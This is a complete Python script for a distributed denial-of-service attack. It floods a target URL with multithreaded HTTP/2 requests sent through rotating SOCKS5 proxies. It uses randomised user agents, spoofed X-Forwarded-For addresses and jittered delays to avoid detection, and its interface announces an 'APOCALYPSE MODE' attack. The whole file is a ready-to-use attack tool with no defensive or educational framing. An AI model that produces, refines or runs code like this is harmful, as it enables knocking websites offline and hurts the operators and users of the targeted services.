import requests
import threading
import random
import time
import socket
import socks
import ssl
import httpx

# Load proxy list
def load_proxies():
    with open("proxies.txt", "r") as file:
        return [proxy.strip() for proxy in file.readlines()]

# Rotating user agents
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/537.36"
]

# Modify request headers for stealth
def generate_headers():
    return {
        "User-Agent": random.choice(user_agents),
        "Accept-Encoding": "gzip, deflate, br",
        "Cache-Control": "no-cache",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "X-Forwarded-For": ".".join(str(random.randint(0, 255)) for _ in range(4))
    }

# HTTPS attack function using HTTP2 for maximum impact
def attack(target_url, proxy_list, thread_count, duration):
    def send_request():
        end_time = time.time() + duration
        while time.time() < end_time:
            proxy = random.choice(proxy_list)
            ip, port = proxy.split(":")
            
            try:
                socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, ip, int(port))
                socket.socket = socks.socksocket
                
                with httpx.Client(http2=True, verify=False, timeout=2) as client:
                    response = client.get(target_url, headers=generate_headers())
                    print(f"🔥 Sent HTTP/2 request via {proxy} | Status: {response.status_code}")
            except:
                print(f"🚨 Proxy {proxy} failed, rotating...")
                proxy_list.remove(proxy)
                if not proxy_list:
                    print("❌ All proxies are down. Attack aborted.")
                    return
            
            time.sleep(random.uniform(0.05, 0.2))  # Randomized delay to prevent detection

    # Launch high-speed threaded attack
    threads = []
    for _ in range(thread_count):
        thread = threading.Thread(target=send_request)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

# Lobby interface
def main():
    print("🚀 **APOCALYPSE MODE: DDoS INITIATED** 🚀")
    target_url = input("🔺 Enter target URL: ")
    thread_count = int(input("🔺 Enter number of threads (500+ recommended): "))
    duration = int(input("🔺 Enter attack duration (seconds): "))

    proxies = load_proxies()
    if not proxies:
        print("⚠️ No proxies found in proxies.txt! Load SOCKS5 proxies.")
        return
    
    print(f"🔥 LAUNCHING FULL-SCALE ATTACK ON {target_url} WITH {thread_count} THREADS FOR {duration} SECONDS... 🔥")
    attack(target_url, proxies, thread_count, duration)

if __name__ == "__main__":
    main()
